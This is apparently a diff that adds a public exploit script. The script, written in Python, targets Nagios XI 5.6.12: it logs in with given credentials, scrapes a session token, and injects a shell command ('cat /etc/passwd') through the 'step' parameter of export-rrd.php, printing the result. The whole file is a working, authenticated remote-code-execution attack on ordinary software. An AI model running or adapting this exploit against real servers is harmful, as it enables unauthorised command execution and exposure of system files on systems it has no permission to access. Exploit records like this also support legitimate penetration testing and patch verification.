@@ -1,0 +1,52 @@
+# Exploit Title: Nagios XI 5.6.12 - 'export-rrd.php' Remote Code Execution
+# Date: 2020-04-11
+# Exploit Author: Basim Alabdullah
+# Vendor homepage: https://www.nagios.com
+# Version: 5.6.12
+# Software link: https://www.nagios.com/downloads/nagios-xi/
+# Tested on: CentOS REDHAT 7.7.1908 (core)
+#
+#                 Authenticated Remote Code Execution
+#
+
+import requests
+import sys
+import re
+
+
+uname=sys.argv[2]
+upass=sys.argv[3]
+ipvictim=sys.argv[1]
+
+with requests.session() as s:
+    urlz=ipvictim+"/login.php"
+    headers = {
+        'Accept-Encoding': 'gzip, deflate, sdch',
+        'Accept-Language': 'en-US,en;q=0.8',
+        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36',
+        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+        'Referer': ipvictim+'/index.php',
+        'Connection': 'keep-alive'
+    }
+    response = s.get(urlz, headers=headers)
+    txt=response.text
+    x=re.findall('var nsp_str = "(.*?)"', txt)
+    for xx in x:
+        login = {
+        'username':uname,
+        'password':upass,
+        'nsp':xx,
+        'page':'auth',
+        'debug':'',
+        'pageopt':'login',
+        'redirect':ipvictim+'/index.php',
+        'loginButton':''
+        }
+        rev=s.post(ipvictim+"/login.php",data=login , headers=headers)
+        cmd=s.get(ipvictim+"/includes/components/ccm/?cmd=modify&type=host&id=1&page=1",allow_redirects=True)
+        txt1=cmd.text
+        xp=re.findall('var nsp_str = "(.*?)"', txt1)
+        for xxp in xp:
+            payload = "a|{cat,/etc/passwd};#"
+            exploit=s.get(ipvictim+"/includes/components/xicore/export-rrd.php?host=localhost&service=Root%20Partition&start=011&end=012&step="+payload+"&type=a&nsp="+xxp)
+            print(exploit.text)
